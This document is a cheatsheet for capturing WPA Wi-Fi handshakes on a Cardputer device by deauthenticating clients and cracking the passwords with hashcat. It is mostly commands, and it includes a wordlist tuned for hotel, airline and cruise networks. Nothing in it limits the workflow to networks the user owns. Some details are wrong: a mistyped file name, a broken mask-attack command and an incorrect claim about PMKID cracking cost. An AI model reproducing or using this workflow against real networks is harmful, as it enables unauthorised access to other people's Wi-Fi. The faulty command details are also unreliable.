# Cardputer ADV Porkchop -> hashcat 22000 Cheatsheet

Capture workflow on the Cardputer ADV:

## 1. Capture on device
- Use **M5Cardputer-Porkchop** or **Marauder** with built-in WiFi sniffer
- Capture 4-way handshake: deauth AP, wait for client reconnect
- Porkchop saves `.pcap` / `.pcapng` to SD root

## 2. Pull capture to host
Pull `.pcapng` from SD card to `tools/caps/`.

## 3. (Optional) Inspect
```bash
tshark -r caps/cap.pcapng -Y eapol              # show EAPOL frames
tshark -r caps/cap.pcapng -Y wlan.fc.type_subtype==0x08  # list APs
python scripts/beacon_audit.py caps/cap.pcapng  # markdown inventory
python scripts/pcapng_split.py caps/cap.png caps/per-ap/  # per-BSSID files
```

## 4. Convert to hashcat format
```bash
python scripts/pcapng_to_22000.py caps/cap.pcapng caps/cap.22000
# or one-shot:
./scripts/pcap2hash.sh caps/cap.pcapng
```

## 5. Crack
```bash
# Direct from pcapng (hashcat v6.2+ reads it):
hashcat -m 22000 caps/cap.pcapng wordlists/rockyou.txt

# From converted .22000:
hashcat -m 22000 caps/cap.22000 wordlists/rockyou.txt

# Hotel/airline/cruise tuned dictionary:
python scripts/hotel_wardict.py --top 30000 > wordlists/hotel.txt
hashcat -m 22000 caps/cap.22000 wordlists/hotel.txt

# Mask attack: 8-10 lower+digits
hashcat -m 22000 caps/cap.22000 -a 3 ?l?l?l?l?l?l?l?l -1 ?l?d
```

## 6. Check results
```bash
cat potfile/hashcat.potfile
python scripts/wpa_summarize.py caps/cap.22000
```

## Hashcat mode 22000 syntax reminder

| Field       | WPA*01 (PMKID)        | WPA*02 (handshake)              |
|-------------|----------------------|---------------------------------|
| fields      | PMKID AP STA ANonce  | MIC AP STA ANonce.. EAPOL_AP    |
| crack time  | 1x HMAC-SHA1         | 1x PBKDF2-HMAC-SHA1 (PMK) + 1x HMAC |
